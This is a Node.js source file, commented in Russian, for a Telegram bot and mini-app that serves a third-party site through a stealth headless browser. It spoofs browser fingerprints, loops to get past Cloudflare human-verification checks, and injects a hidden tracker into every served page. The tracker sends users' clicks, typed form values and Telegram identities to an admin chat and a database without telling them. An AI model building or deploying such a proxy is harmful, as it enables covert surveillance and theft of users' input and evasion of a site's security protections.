require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

// Добавляем stealth плагин для обхода защиты
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());

// Database
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Telegram Bot
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';
const PROXY_URL = process.env.PROXY_URL;

// Браузер
let browser = null;

async function getBrowser() {
  if (!browser) {
    const args = [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-blink-features=AutomationControlled',
      '--disable-features=IsolateOrigins,site-per-process'
    ];
    
    // Используем currentProxy (может быть изменён через бота)
    const proxyToUse = currentProxy || PROXY_URL;
    
    if (proxyToUse && proxyToUse.trim()) {
      console.log('Using proxy:', proxyToUse.replace(/:[^:@]+@/, ':***@'));
      args.push(`--proxy-server=${proxyToUse}`);
    } else {
      console.log('No proxy configured');
    }
    
    try {
      browser = await puppeteer.launch({
        headless: 'new',
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
        args,
        protocolTimeout: 90000,
        timeout: 90000,
        ignoreHTTPSErrors: true
      });
    } catch (err) {
      console.error('Failed to launch browser with current config:', err.message);
      // Retry without proxy if it failed
      if (PROXY_URL) {
        console.log('Retrying without proxy...');
        const argsNoProxy = args.filter(arg => !arg.startsWith('--proxy-server='));
        browser = await puppeteer.launch({
          headless: 'new',
          executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
          args: argsNoProxy,
          protocolTimeout: 90000,
          timeout: 90000,
          ignoreHTTPSErrors: true
        });
      } else {
        throw err;
      }
    }
  }
  return browser;
}

// Инициализация БД
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
      id SERIAL PRIMARY KEY,
      session_id VARCHAR(255),
      telegram_user JSONB,
      event_type VARCHAR(50),
      element VARCHAR(255),
      value TEXT,
      page_url TEXT,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);
}
initDB();

// Трекер скрипт
const trackerScript = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function() {
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }
  const telegramUser = tg?.initDataUnsafe?.user || null;
  const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
  
  function sendLog(eventType, element, value) {
    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, telegramUser, eventType, element, value: value || '', pageUrl: location.href })
    }).catch(() => {});
  }
  
  sendLog('pageview', document.title || location.pathname);
  
  document.addEventListener('click', (e) => {
    const el = e.target;
    const tag = el.tagName.toLowerCase();
    const text = el.innerText?.slice(0, 50) || '';
    const id = el.id ? '#' + el.id : '';
    const cls = el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : '';
    sendLog('click', tag + id + cls, text);
  });
  
  document.addEventListener('change', (e) => {
    const el = e.target;
    if (['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) {
      const name = el.name || el.id || el.placeholder || 'field';
      const val = el.type === 'password' ? '***' : el.value;
      sendLog('input', name, val);
    }
  });
  
  document.addEventListener('submit', (e) => {
    sendLog('submit', e.target.name || e.target.id || 'form');
  });
})();
</script>
`;

// API логирования
app.post('/api/log', async (req, res) => {
  const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
  
  try {
    await pool.query(
      'INSERT INTO logs (session_id, telegram_user, event_type, element, value, page_url) VALUES ($1, $2, $3, $4, $5, $6)',
      [sessionId, JSON.stringify(telegramUser), eventType, element, value, pageUrl]
    );
    
    const icons = { click: '👆', input: '⌨️', submit: '📤', pageview: '👁️' };
    const icon = icons[eventType] || '📝';
    const user = telegramUser?.username ? '@' + telegramUser.username : telegramUser?.id || 'Аноним';
    
    let msg = icon + ' ' + eventType.toUpperCase() + '\n';
    msg += '👤 ' + user + '\n';
    msg += '🎯 ' + element + '\n';
    if (value) msg += '📝 ' + value + '\n';
    msg += '🔗 ' + pageUrl;
    
    await bot.sendMessage(ADMIN_ID, msg);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error' });
  }
});

// Прокси через Puppeteer
app.get('*', async (req, res) => {
  const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
  console.log('Fetching with Puppeteer:', url);
  
  let page = null;
  try {
    const br = await getBrowser();
    page = await br.newPage();
    
    // Увеличиваем таймауты
    page.setDefaultTimeout(90000);
    page.setDefaultNavigationTimeout(90000);
    
    // Более реалистичный User-Agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.setViewport({ width: 1920, height: 1080 });
    
    // Убираем все признаки автоматизации
    await page.evaluateOnNewDocument(() => {
      // Скрываем webdriver
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
      
      // Добавляем плагины
      Object.defineProperty(navigator, 'plugins', { 
        get: () => [
          { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
          { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
          { name: 'Native Client', filename: 'internal-nacl-plugin' }
        ] 
      });
      
      // Языки
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'ru'] });
      
      // Chrome объект
      window.chrome = { 
        runtime: {},
        loadTimes: function() {},
        csi: function() {},
        app: {}
      };
      
      // Permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
          Promise.resolve({ state: Notification.permission }) :
          originalQuery(parameters)
      );
      
      // WebGL vendor
      const getParameter = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function(parameter) {
        if (parameter === 37445) return 'Intel Inc.';
        if (parameter === 37446) return 'Intel Iris OpenGL Engine';
        return getParameter.apply(this, [parameter]);
      };
    });
    
    // Включаем JavaScript и все фичи
    await page.setJavaScriptEnabled(true);
    
    // Разрешаем все разрешения
    const context = br.defaultBrowserContext();
    await context.overridePermissions(url, ['geolocation', 'notifications']);
    
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 90000 });
    
    // Ждём загрузки Cloudflare challenge
    let attempts = 0;
    const maxAttempts = 60; // 60 секунд
    
    while (attempts < maxAttempts) {
      const pageContent = await page.content();
      const title = await page.title();
      
      // Проверяем прошли ли Cloudflare
      if (!title.includes('Just a moment') && 
          !title.includes('Verify you are human') &&
          !pageContent.includes('Checking your browser') &&
          !pageContent.includes('cf-challenge-running')) {
        console.log('Cloudflare passed!');
        break;
      }
      
      // Ждём и пробуем кликнуть по чекбоксу если он есть
      try {
        const checkbox = await page.$('input[type="checkbox"]');
        if (checkbox) {
          console.log('Found checkbox, clicking...');
          await checkbox.click();
          await page.waitForTimeout(2000);
        }
      } catch (e) {}
      
      await page.waitForTimeout(1000);
      attempts++;
    }
    
    // Дополнительная задержка
    await page.waitForTimeout(3000);
    
    let html = await page.content();
    
    // Внедряем трекер
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackerScript + '</body>');
    } else {
      html += trackerScript;
    }
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (err) {
    console.error('Puppeteer error:', err.message);
    res.status(500).send(`
      <html><body style="font-family:sans-serif;padding:20px;">
        <h2>❌ Ошибка загрузки</h2>
        <p>${err.message}</p>
      </body></html>
    `);
  } finally {
    if (page) await page.close().catch(() => {});
  }
});

// Команды бота
bot.onText(/\/start/, (msg) => {
  const webappUrl = process.env.WEBAPP_URL || 'https://your-app.railway.app';
  bot.sendMessage(msg.chat.id, '👋 Открой приложение:', {
    reply_markup: {
      inline_keyboard: [[{ text: '🚀 Открыть', web_app: { url: webappUrl } }]]
    }
  });
});

bot.onText(/\/test/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  bot.sendMessage(msg.chat.id, '⏳ Тестирую загрузку через Puppeteer...');
  
  let page = null;
  try {
    const br = await getBrowser();
    page = await br.newPage();
    
    page.setDefaultTimeout(90000);
    page.setDefaultNavigationTimeout(90000);
    
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.setViewport({ width: 1920, height: 1080 });
    
    // Убираем все признаки автоматизации
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
      Object.defineProperty(navigator, 'plugins', { 
        get: () => [
          { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
          { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' }
        ] 
      });
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'ru'] });
      window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {} };
    });
    
    await page.setJavaScriptEnabled(true);
    const context = br.defaultBrowserContext();
    await context.overridePermissions(TARGET_SITE, ['geolocation', 'notifications']);
    
    const start = Date.now();
    await page.goto(TARGET_SITE, { waitUntil: 'networkidle2', timeout: 90000 });
    
    bot.sendMessage(msg.chat.id, '⏳ Жду прохождения Cloudflare...');
    
    // Ждём Cloudflare
    let attempts = 0;
    while (attempts < 60) {
      const title = await page.title();
      const content = await page.content();
      
      if (!title.includes('Just a moment') && 
          !title.includes('Verify you are human') &&
          !content.includes('Checking your browser')) {
        break;
      }
      
      // Пробуем кликнуть чекбокс
      try {
        const checkbox = await page.$('input[type="checkbox"]');
        if (checkbox) await checkbox.click();
      } catch (e) {}
      
      await page.waitForTimeout(1000);
      attempts++;
    }
    
    await page.waitForTimeout(3000);
    
    const time = Date.now() - start;
    const title = await page.title();
    const finalContent = await page.content();
    
    const passed = !title.includes('Just a moment') && 
                   !title.includes('Verify you are human') &&
                   !finalContent.includes('cf-challenge-running');
    
    bot.sendMessage(msg.chat.id, 
      `${passed ? '✅' : '⚠️'} ${passed ? 'Успешно!' : 'Частично'}\n` +
      `⏱️ Время: ${time}ms\n` +
      `📄 Заголовок: ${title}\n` +
      `🔒 Прокси: ${currentProxy ? 'да' : 'нет'}\n` +
      `${!passed ? '\n⚠️ Cloudflare не пройден полностью' : ''}`
    );
  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Ошибка: ${err.message}`);
  } finally {
    if (page) await page.close().catch(() => {});
  }
});

bot.onText(/\/logs/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  const result = await pool.query('SELECT * FROM logs ORDER BY created_at DESC LIMIT 10');
  if (!result.rows.length) return bot.sendMessage(msg.chat.id, 'Логов нет');
  let text = '📊 Последние события:\n\n';
  result.rows.forEach((l, i) => { text += (i+1) + '. ' + l.event_type + ' — ' + l.element + '\n'; });
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/clear/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  await pool.query('DELETE FROM logs');
  bot.sendMessage(msg.chat.id, '🗑️ Очищено');
});

// Временное хранилище прокси (в памяти)
let currentProxy = PROXY_URL;

bot.onText(/\/setproxy (.+)/, async (msg, match) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  const proxyInput = match[1].trim();
  
  bot.sendMessage(msg.chat.id, `🔍 Тестирую прокси: ${proxyInput.replace(/:[^:@]+@/, ':***@')}`);
  
  // Парсим формат IP:PORT:USER:PASS
  let testProxies = [];
  
  if (proxyInput.includes('@')) {
    // Уже в формате user:pass@ip:port
    testProxies = [
      `http://${proxyInput}`,
      `socks5://${proxyInput}`,
      proxyInput
    ];
  } else {
    // Формат IP:PORT:USER:PASS
    const parts = proxyInput.split(':');
    if (parts.length === 4) {
      const [ip, port, user, pass] = parts;
      testProxies = [
        `http://${user}:${pass}@${ip}:${port}`,
        `socks5://${user}:${pass}@${ip}:${port}`,
        `${user}:${pass}@${ip}:${port}`
      ];
    } else if (parts.length === 2) {
      // Формат IP:PORT без авторизации
      testProxies = [
        `http://${proxyInput}`,
        `socks5://${proxyInput}`,
        proxyInput
      ];
    } else {
      return bot.sendMessage(msg.chat.id, 
        '❌ Неверный формат!\n\n' +
        'Используй один из форматов:\n' +
        '• IP:PORT:USER:PASS\n' +
        '• IP:PORT\n' +
        '• http://user:pass@ip:port\n' +
        '• user:pass@ip:port'
      );
    }
  }
  
  // Тестируем форматы
  for (let i = 0; i < testProxies.length; i++) {
    const testProxy = testProxies[i];
    let testBrowser = null;
    
    try {
      const formatName = testProxy.includes('://') ? testProxy.split('://')[0] : 'без протокола';
      bot.sendMessage(msg.chat.id, `⏳ Тест ${i+1}/${testProxies.length}: ${formatName}...`);
      
      const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        `--proxy-server=${testProxy}`
      ];
      
      testBrowser = await puppeteer.launch({
        headless: 'new',
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
        args,
        protocolTimeout: 20000,
        timeout: 20000
      });
      
      const testPage = await testBrowser.newPage();
      testPage.setDefaultTimeout(20000);
      
      await testPage.goto('https://api.ipify.org?format=json', { timeout: 20000 });
      const content = await testPage.content();
      const ipMatch = content.match(/"ip":"([^"]+)"/);
      const proxyIP = ipMatch ? ipMatch[1] : 'неизвестно';
      
      await testBrowser.close();
      
      // Закрываем старый браузер и применяем новый прокси
      if (browser) {
        await browser.close().catch(() => {});
        browser = null;
      }
      
      currentProxy = testProxy;
      
      return bot.sendMessage(msg.chat.id, 
        `✅ Прокси работает и применён!\n\n` +
        `📡 Формат: ${formatName}\n` +
        `🌐 IP через прокси: ${proxyIP}\n` +
        `🔗 Прокси: ${testProxy.replace(/:[^:@]+@/, ':***@')}\n\n` +
        `⚠️ Прокси работает до перезапуска бота.\n` +
        `Для постоянного использования добавь в Railway:\n` +
        `PROXY_URL=${testProxy}`
      );
      
    } catch (err) {
      if (testBrowser) await testBrowser.close().catch(() => {});
      await bot.sendMessage(msg.chat.id, `❌ Формат ${i+1} не работает`);
    }
  }
  
  bot.sendMessage(msg.chat.id, 
    '❌ Ни один формат не сработал.\n\n' +
    'Возможные причины:\n' +
    '• Неверные данные прокси\n' +
    '• Прокси не работает\n' +
    '• Прокси заблокирован\n' +
    '• Неверный логин/пароль'
  );
});

bot.onText(/\/proxy$/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  const activeProxy = currentProxy || 'не настроен';
  const maskedProxy = activeProxy !== 'не настроен' ? activeProxy.replace(/:[^:@]+@/, ':***@') : activeProxy;
  
  bot.sendMessage(msg.chat.id, 
    `🔧 Управление прокси\n\n` +
    `📡 Текущий прокси: ${maskedProxy}\n\n` +
    `Команды:\n` +
    `/setproxy IP:PORT:USER:PASS - установить прокси\n` +
    `/setproxy http://user:pass@ip:port - установить прокси\n` +
    `/noproxy - отключить прокси\n` +
    `/testproxy - проверить текущий прокси`
  );
});

bot.onText(/\/noproxy/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  if (browser) {
    await browser.close().catch(() => {});
    browser = null;
  }
  
  currentProxy = null;
  bot.sendMessage(msg.chat.id, '✅ Прокси отключен');
});

bot.onText(/\/testproxy/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  if (!currentProxy) {
    return bot.sendMessage(msg.chat.id, '❌ Прокси не настроен. Используй /setproxy');
  }
  
  bot.sendMessage(msg.chat.id, '⏳ Проверяю прокси...');
  
  let testBrowser = null;
  try {
    const args = [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      `--proxy-server=${currentProxy}`
    ];
    
    testBrowser = await puppeteer.launch({
      headless: 'new',
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
      args,
      protocolTimeout: 20000,
      timeout: 20000
    });
    
    const testPage = await testBrowser.newPage();
    testPage.setDefaultTimeout(20000);
    
    const start = Date.now();
    await testPage.goto('https://api.ipify.org?format=json', { timeout: 20000 });
    const time = Date.now() - start;
    
    const content = await testPage.content();
    const ipMatch = content.match(/"ip":"([^"]+)"/);
    const proxyIP = ipMatch ? ipMatch[1] : 'неизвестно';
    
    await testBrowser.close();
    
    bot.sendMessage(msg.chat.id, 
      `✅ Прокси работает!\n\n` +
      `🌐 IP: ${proxyIP}\n` +
      `⏱️ Время: ${time}ms\n` +
      `🔗 Прокси: ${currentProxy.replace(/:[^:@]+@/, ':***@')}`
    );
    
  } catch (err) {
    if (testBrowser) await testBrowser.close().catch(() => {});
    bot.sendMessage(msg.chat.id, `❌ Прокси не работает: ${err.message}`);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server on port ' + PORT));

// Закрытие браузера при выходе
process.on('SIGTERM', async () => {
  if (browser) await browser.close();
  process.exit(0);
});
